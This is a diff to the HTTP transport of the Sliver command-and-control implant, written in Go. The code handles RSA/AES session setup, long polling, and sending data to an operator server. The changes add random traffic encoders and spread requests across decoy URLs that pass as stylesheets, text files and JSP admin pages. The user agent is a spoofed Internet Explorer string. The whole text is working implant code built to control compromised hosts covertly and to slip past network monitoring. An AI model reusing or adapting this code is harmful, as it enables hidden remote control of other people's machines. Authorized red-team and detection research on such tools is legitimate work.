@@ -23,10 +23,9 @@ package transports
 // Procedural C2
 // ===============
 // .txt = rsakey
-// .css = start
+// .jsp = init
 // .php = session
 //  .js = poll
-// .png = stop
 
 import (
 	"bytes"
@@ -38,6 +37,7 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	insecureRand "math/rand"
 	"strings"
 
 	"sync"
@@ -45,22 +45,20 @@ import (
 	"log"
 	// {{end}}
 
-	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
 	"path"
 	"time"
 
-	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/encoders"
 	"github.com/bishopfox/sliver/sliver/proxy"
-
 	"github.com/golang/protobuf/proto"
 )
 
 const (
-	// IE 11 User-agent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-	defaultUserAgent  = "Mozillа/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+	defaultUserAgent  = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
 	defaultNetTimeout = time.Second * 60
 	defaultReqTimeout = time.Second * 60 // Long polling, we want a large timeout
 )
@@ -92,18 +90,18 @@ type SliverHTTPClient struct {
 	SessionID  string
 }
 
-// SessionInit - Initailize the session
+// SessionInit - Initialize the session
 func (s *SliverHTTPClient) SessionInit() error {
 	publicKey := s.getPublicKey()
 	if publicKey == nil {
 		// {{if .Debug}}
 		log.Printf("Invalid public key")
 		// {{end}}
-		return errors.New("error")
+		return errors.New("{{if .Debug}}Invalid public key{{end}}")
 	}
-	skey := RandomAESKey()
-	s.SessionKey = &skey
-	httpSessionInit := &pb.HTTPSessionInit{Key: skey[:]}
+	sKey := RandomAESKey()
+	s.SessionKey = &sKey
+	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 	encryptedSessionInit, err := RSAEncrypt(data, publicKey)
 	if err != nil {
@@ -119,10 +117,13 @@ func (s *SliverHTTPClient) SessionInit() error {
 	return nil
 }
 
-func (s *SliverHTTPClient) newHTTPRequest(method, uri string, body io.Reader) *http.Request {
+func (s *SliverHTTPClient) newHTTPRequest(method, uri string, encoderNonce int, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri, body)
 	req.Header.Set("User-Agent", defaultUserAgent)
 	req.Header.Set("Accept-Language", "en-US")
+	query := req.URL.Query()
+	query.Set("_", fmt.Sprintf("%d", encoderNonce))
+	req.URL.RawQuery = query.Encode()
 	return req
 }
 
@@ -131,7 +132,8 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	// {{if .Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	nonce, encoder := encoders.RandomEncoder()
+	req := s.newHTTPRequest(http.MethodGet, uri, nonce, nil)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Debug}}
@@ -142,7 +144,14 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	// {{if .Debug}}
 	log.Printf("[http] <- %d Server key response", resp.StatusCode)
 	// {{end}}
-	data, _ := ioutil.ReadAll(resp.Body)
+	respData, _ := ioutil.ReadAll(resp.Body)
+	data, err := encoder.Decode(respData)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("[http] Failed to decode response: %s", err)
+		// {{end}}
+		return nil
+	}
 	pubKeyBlock, _ := pem.Decode(data)
 	if pubKeyBlock == nil {
 		// {{if .Debug}}
@@ -169,9 +178,19 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 // We do our own POST here because the server doesn't have the
 // session key yet.
 func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
-	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
-	uri := s.cssURL()
-	req := s.newHTTPRequest(http.MethodPost, uri, reader)
+
+	nonce, encoder := encoders.RandomEncoder()
+	// {{if .Debug}}
+	log.Printf("[http] sessionInit = %v", sessionInit)
+	// {{end}}
+	payload := encoder.Encode(sessionInit)
+	// {{if .Debug}}
+	log.Printf("[http] Encoded payload (%d) %v", nonce, payload)
+	// {{end}}
+	reqBody := bytes.NewReader(payload) // Already RSA encrypted
+
+	uri := s.jspURL()
+	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reqBody)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
@@ -184,7 +203,11 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	}
 	respData, _ := ioutil.ReadAll(resp.Body)
 	defer resp.Body.Close()
-	sessionID, err := GCMDecrypt(*s.SessionKey, respData)
+	data, err := encoder.Decode(respData)
+	if err != nil {
+		return err
+	}
+	sessionID, err := GCMDecrypt(*s.SessionKey, data)
 	if err != nil {
 		return err
 	}
@@ -201,9 +224,10 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		return nil, errors.New("no session")
 	}
 	uri := s.jsURL()
-	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	nonce, encoder := encoders.RandomEncoder()
+	req := s.newHTTPRequest(http.MethodGet, uri, nonce, nil)
 	// {{if .Debug}}
-	log.Printf("[http] POST -> %s", uri)
+	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
 	resp, err := s.Client.Do(req)
 	if err != nil {
@@ -221,9 +245,19 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		// {{end}}
 		return nil, errors.New("invalid session")
 	}
+	var data []byte
 	respData, _ := ioutil.ReadAll(resp.Body)
 	defer resp.Body.Close()
-	return GCMDecrypt(*s.SessionKey, respData)
+	if 0 < len(respData) {
+		data, err = encoder.Decode(respData)
+		if err != nil {
+			// {{if .Debug}}
+			log.Printf("Decoding failed %s", err)
+			// {{end}}
+			return nil, err
+		}
+	}
+	return GCMDecrypt(*s.SessionKey, data)
 }
 
 // Send - Perform an HTTP POST request
@@ -232,12 +266,14 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 		return errors.New("no session")
 	}
 	reqData, err := GCMEncrypt(*s.SessionKey, data)
-	reader := bytes.NewReader(reqData)
+
+	nonce, encoder := encoders.RandomEncoder()
+	reader := bytes.NewReader(encoder.Encode(reqData))
 	uri := s.phpURL()
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
-	req := s.newHTTPRequest(http.MethodPost, uri, reader)
+	req := s.newHTTPRequest(http.MethodPost, uri, nonce, reader)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Debug}}
@@ -246,7 +282,7 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 		return err
 	}
 	if resp.StatusCode != 200 {
-		return errors.New("send failed")
+		return errors.New("{{if .Debug}}HTTP send failed (non-200 resp){{end}}")
 	}
 	return nil
 }
@@ -259,10 +295,10 @@ func (s *SliverHTTPClient) jsURL() string {
 	return curl.String()
 }
 
-func (s *SliverHTTPClient) cssURL() string {
+func (s *SliverHTTPClient) jspURL() string {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{"css", "static", "assets", "dist", "stylesheets", "style"}
-	filenames := []string{"bootstrap.min.css"}
+	segments := []string{"app", "admin", "upload", "actions", "api"}
+	filenames := []string{"login.jsp", "admin.jsp", "session.jsp", "action.jsp"}
 	curl.Path = path.Join(s.randomPath(segments, filenames)...)
 	return curl.String()
 }
@@ -277,16 +313,14 @@ func (s *SliverHTTPClient) phpURL() string {
 
 func (s *SliverHTTPClient) txtURL() string {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{"static", "www", "assets", "textual", "docs", "sample"}
+	segments := []string{"static", "www", "assets", "text", "docs", "sample"}
 	filenames := []string{"robots.txt", "sample.txt", "info.txt", "example.txt"}
 	curl.Path = path.Join(s.randomPath(segments, filenames)...)
 	return curl.String()
 }
 
 func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []string {
-	seed := rand.NewSource(time.Now().UnixNano())
-	insecureRand := rand.New(seed)
-	n := insecureRand.Intn(2) // How many segements?
+	n := insecureRand.Intn(2) // How many segments?
 	genSegments := []string{}
 	for index := 0; index < n; index++ {
 		seg := segments[insecureRand.Intn(len(segments))]
